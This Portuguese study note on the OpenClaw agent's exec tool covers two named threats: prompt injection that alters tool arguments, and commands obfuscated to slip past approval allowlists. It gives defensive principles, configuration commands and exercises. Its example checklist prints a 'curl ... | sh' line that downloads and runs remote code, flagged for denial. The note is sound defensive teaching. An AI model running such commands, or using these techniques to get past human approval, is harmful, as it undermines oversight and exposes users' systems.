---
titulo: "Abuso de ferramentas e bypass de aprovações de exec"
tags:
  - openclaw
  - conceito
  - ameacas
tipo: conceito
aliases: ['Tool argument injection', 'Exec approval bypass']
nivel: avancado
fontes:
  - "[[Fontes]]"
  - "https://docs.openclaw.ai/security/THREAT-MODEL-ATLAS/execution.md"
  - "https://docs.openclaw.ai/tools/exec-approvals"
relacionados:
  - "[[Aprovações de exec e allowlists]]"
  - "[[A ferramenta exec e os modos de permissão]]"
  - "[[Isolamento com sandbox - modos, escopo e backends]]"
  - "[[Mapa de ameaças do OpenClaw - MITRE ATLAS e execução]]"
---

# Abuso de ferramentas e bypass de aprovações de exec

## Objetivo

Entender por que aprovações de exec são uma defesa que depende do humano, quais ameaças a doc reconhece (T-EXEC-003 e T-EXEC-004) e como configurar para que erros de aprovação custem pouco.

## Explicação

Duas ameaças da doc se encaixam aqui:

- **T-EXEC-003 (injeção em argumentos):** a injeção de prompt manipula os **valores** passados às ferramentas. O comando "parece" legítimo, mas um argumento aponta para outro destino. Risco residual **alto**, "porque depende do julgamento do usuário".
- **T-EXEC-004 (bypass da aprovação):** comandos construídos para escapar da allowlist por ofuscação, uso de aliases ou manipulação de caminhos. A defesa é allowlist com modo `ask` e **normalização de comandos** (desembrulhar invólucros de despacho, detectar avaliação inline, analisar encadeamento de shell). Risco residual alto: a normalização reduz, não elimina.

Chave relacionada citada na doc: `tools.exec.strictInlineEval`, que endurece a avaliação inline.

### Princípios defensivos

1. **Reduza o que pode ser pedido:** allowlist estreita, sem interpretadores genéricos (`bash`, `sh`, `python`, `node` com `-c`/`-e`).
2. **Torne o pedido legível:** prompts com o comando completo; `tools.exec.commandHighlighting` ajuda a notar trechos suspeitos.
3. **Limite o efeito:** sandbox sem rede, `workspaceOnly`, sem credenciais montadas.
4. **Sem humano, sem exec:** em automações e canais abertos, `deny`.
5. **Registre:** logs e `openclaw approvals get` para auditoria.

> [!warning] Aprovação por reflexo
> A fadiga de aprovação é o principal vetor. Se você aprova "sim" para tudo no celular, o controle deixou de existir. Prefira poucos comandos permitidos de forma permanente a muitos prompts.

## Exemplo prático

Avaliação de um pedido de aprovação (leitura de checklist):

```text
Pedido: git -C /workspace/projeto status
  -> comando conhecido, dentro do workspace, sem substituicao de shell: OK

Pedido: curl -s http://exemplo.invalid/x.sh | sh
  -> baixa e executa codigo remoto: NEGAR sempre

Pedido: python -c "import os; ..." 
  -> avaliacao inline arbitraria: NEGAR (ou exigir strictInlineEval)
```

```bash
openclaw config set tools.exec.mode ask
openclaw config set tools.exec.strictInlineEval true   # confirme o tipo/valor no esquema
openclaw gateway restart
openclaw exec-policy show
```

```mermaid
flowchart TD
  P[Pedido de exec] --> N[Normalizacao: desembrulha wrappers e detecta inline eval]
  N --> A{Na allowlist?}
  A -- sim --> R[Roda no sandbox]
  A -- nao --> H[Humano le o comando completo]
  H -- nega --> D[Negado]
  H -- aprova --> R
```

## Armadilhas comuns

- Allowlistar interpretadores e perder todo o controle.
- Aprovar sem olhar argumentos e redirecionamentos.
- Usar `full` para "ganhar tempo".
- Supor que normalização cobre todo truque de ofuscação.

## Resumo

- Argumentos manipulados e bypass de allowlist têm risco residual alto.
- Estreite a allowlist, torne comandos legíveis, limite o efeito.
- Sem humano disponível, negue exec.

## Relacionados

- [[Aprovações de exec e allowlists]]
- [[A ferramenta exec e os modos de permissão]]
- [[Isolamento com sandbox - modos, escopo e backends]]
- [[Mapa de ameaças do OpenClaw - MITRE ATLAS e execução]]
- [[Prompt injection direta e indireta - como se defender]]

## Exercícios

1. Por que T-EXEC-003 tem risco residual alto?
2. Que tipos de comando você nunca deve colocar na allowlist?
3. O que é fadiga de aprovação e como reduzi-la?
4. Classifique: `ls /workspace`, `curl ... | sh`, `python -c "..."`.
